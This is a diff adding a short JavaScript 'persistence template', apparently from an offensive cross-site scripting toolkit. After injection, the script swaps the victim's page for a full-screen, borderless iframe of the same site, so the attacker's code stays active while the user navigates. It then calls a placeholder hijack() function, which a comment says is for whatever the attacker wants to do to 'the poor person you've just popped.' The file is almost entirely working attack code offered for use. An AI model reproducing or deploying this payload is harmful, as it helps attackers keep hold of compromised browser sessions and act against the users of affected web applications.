@@ -1,0 +1,32 @@
+Persistance Template
+
+------$$gr4y-r0se$$------
+
+Provides a template for hijacking applications, will work on any app that allows iFrames from the local domain.
+
+------$$gr4y-r0se$$------
+
+text/javascript
+
+------$$gr4y-r0se$$------
+
+if (window.self === window.top) {
+
+    function resizeIframe() {
+        const iframe = document.getElementById('hijacked');
+        iframe.style.width = window.innerWidth + 'px';
+        iframe.style.height = window.innerHeight + 'px';
+    }
+    function hijack() {
+        //here, you put whatever it is you want to do to the poor person you've just popped.
+    }
+    var body = document.getElementsByTagName('body')[0];
+    const page_url = location.pathname;
+    body.setAttribute('style','overflow: hidden;');
+    body.innerHTML = '<iframe src="" id="hijacked"  scrolling="no" style="border: none;  overflow: hidden;"></iframe>';
+    resizeIframe();
+    const iframe = document.getElementById('hijacked');
+    iframe.addEventListener('load', hijack);
+    iframe.src = page_url;
+    window.addEventListener('resize', resizeIframe);
+}
